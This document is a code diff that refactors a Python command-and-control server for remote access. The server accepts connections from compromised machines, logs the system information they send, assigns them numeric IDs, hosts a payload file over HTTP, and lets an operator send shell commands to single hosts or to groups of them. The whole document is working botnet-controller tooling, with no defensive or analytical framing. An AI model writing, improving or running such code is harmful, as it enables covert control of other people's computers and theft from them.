@@ -15,40 +15,50 @@ HOST = config['server_host']
 PORT = config['server_port']
 LOG_FILE = config['log_file']
 PAYLOAD_FILENAME = config['payload_filename']
-HTTP_PORT = config['http_port']
+HTTP_PORT = config.get('http_port', 80)  # Default to port 80 if not specified
 
 # Configure logging
 logging.basicConfig(filename=LOG_FILE, level=logging.INFO, format='%(asctime)s - %(message)s')
 
-# Store connected clients and groups
+# Store connected clients and their numeric IDs
 clients = {}
 client_groups = {}
+client_id_counter = 1
+client_id_map = {}
 
 def handle_client(client_socket, addr):
+    global client_id_counter
     with client_socket:
         client_id = f"{addr[0]}:{addr[1]}"
+        numeric_id = client_id_counter
+        client_id_counter += 1
+
+        # Assign the numeric ID to the client
+        clients[numeric_id] = client_socket
+        client_id_map[numeric_id] = client_id
+        
         try:
             system_info = client_socket.recv(4096).decode('utf-8')
             logging.info(f"Connected to {client_id}")
             logging.info(f"System Information from {client_id}:\n{system_info}")
             print(f"[*] System Information from {client_id}:\n{system_info}")
             
-            clients[client_id] = client_socket
             while True:
                 command = client_socket.recv(1024).decode('utf-8')
                 if command.lower() == 'exit':
-                    print(f"[*] Client {client_id} has exited.")
+                    print(f"[*] Client {numeric_id} has exited.")
                     break
                 elif command:
                     response = os.popen(command).read()
                     client_socket.sendall(response.encode())
         except Exception as e:
-            logging.error(f"Error handling client {client_id}: {e}")
+            logging.error(f"Error handling client {numeric_id}: {e}")
             print(f"[!] Error: {e}")
         finally:
-            del clients[client_id]
+            del clients[numeric_id]
+            del client_id_map[numeric_id]
             client_socket.close()
-            logging.info(f"Connection to {client_id} closed")
+            logging.info(f"Connection to {numeric_id} closed")
 
 def start_listener():
     server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -58,8 +68,7 @@ def start_listener():
 
     while True:
         client_socket, addr = server.accept()
-        client_id = f"{addr[0]}:{addr[1]}"
-        print(f"[*] Accepted connection from {client_id}")
+        print(f"[*] Accepted connection from {addr[0]}:{addr[1]}")
         client_handler = threading.Thread(target=handle_client, args=(client_socket, addr))
         client_handler.start()
 
@@ -104,27 +113,30 @@ def show_menu():
 
 def list_connections():
     print("\n--- Active Connections ---")
-    for client_id in clients:
-        print(client_id)
+    for numeric_id, client_socket in clients.items():
+        print(f"ID {numeric_id}: {client_id_map[numeric_id]}")
 
 def interact_with_client():
-    client_id = input("Enter the client ID to interact with: ")
-    if client_id in clients:
-        client_socket = clients[client_id]
-        while True:
-            command = input(f"{client_id}> ")
-            if command.lower() == 'exit':
-                break
-            client_socket.sendall(command.encode())
-            response = client_socket.recv(4096).decode('utf-8')
-            print(response)
-    else:
-        print(f"[!] No active connection with ID: {client_id}")
+    try:
+        numeric_id = int(input("Enter the client ID to interact with: "))
+        if numeric_id in clients:
+            client_socket = clients[numeric_id]
+            while True:
+                command = input(f"{numeric_id}> ")
+                if command.lower() == 'exit':
+                    break
+                client_socket.sendall(command.encode())
+                response = client_socket.recv(4096).decode('utf-8')
+                print(response)
+        else:
+            print(f"[!] No active connection with ID: {numeric_id}")
+    except ValueError:
+        print("[!] Invalid ID format. Please enter a numeric ID.")
 
 def create_client_group():
     group_name = input("Enter the group name: ")
     client_ids = input("Enter the client IDs to add to the group (comma-separated): ").split(',')
-    client_groups[group_name] = [client_id.strip() for client_id in client_ids if client_id.strip() in clients]
+    client_groups[group_name] = [int(client_id.strip()) for client_id in client_ids if client_id.strip().isdigit() and int(client_id.strip()) in clients]
     print(f"[*] Created group '{group_name}' with clients: {client_groups[group_name]}")
 
 def list_client_groups():
@@ -139,25 +151,22 @@ def interact_with_client_group():
             command = input(f"{group_name}> ")
             if command.lower() == 'exit':
                 break
-            for client_id in client_groups[group_name]:
-                if client_id in clients:
-                    client_socket = clients[client_id]
+            for numeric_id in client_groups[group_name]:
+                if numeric_id in clients:
+                    client_socket = clients[numeric_id]
                     client_socket.sendall(command.encode())
                     response = client_socket.recv(4096).decode('utf-8')
-                    print(f"{client_id}: {response}")
+                    print(f"ID {numeric_id}: {response}")
     else:
         print(f"[!] No group with name: {group_name}")
 
 if __name__ == "__main__":
-    # Start the HTTP server in a separate thread
-    http_thread = threading.Thread(target=start_http_server)
-    http_thread.daemon = True
-    http_thread.start()
-
-    # Start the socket listener in a separate thread
     listener_thread = threading.Thread(target=start_listener)
     listener_thread.daemon = True
     listener_thread.start()
 
-    # Show the menu
+    http_thread = threading.Thread(target=start_http_server)
+    http_thread.daemon = True
+    http_thread.start()
+
     show_menu()
